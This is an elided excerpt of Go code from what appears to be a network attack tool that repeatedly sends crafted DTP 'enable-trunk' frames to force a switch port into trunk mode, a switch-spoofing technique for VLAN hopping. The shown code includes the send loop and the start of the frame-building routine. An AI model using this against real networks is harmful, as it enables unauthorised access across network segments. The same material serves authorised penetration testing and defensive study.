...
func (e *Enabler) Run() error {
	...
	go func() {
		<-sig
		fmt.Printf("\n%s Enable-trunk stopped.\n", dtpTag)
		os.Exit(0)
	}()

	frame := buildEnableTrunkFrame(src)
	fmt.Printf("%s Starting DTP enable-trunk on %s from %s\n", dtpTag, iface.Name, src)
	fmt.Printf("%s Sending trunk-negotiation DTP frames... (Ctrl+C to stop)\n", dtpTag)
	...
	go func() {
		...
		for range t.C {
			...
			fmt.Printf("%s Sent enable-trunk DTP frame\n", dtpTag)
		}
	}()
...
func buildEnableTrunkFrame(src net.HardwareAddr) []byte {
	payload := make([]byte, 0, 64)
	payload = append(payload, 0x01)
	payload = append(payload, tlvString(0x0001, "")...)
	payload = append(payload, tlvByte(0x0002, 0x83)...)
	payload = append(payload, tlvByte(0x0003, 0xa5)...)
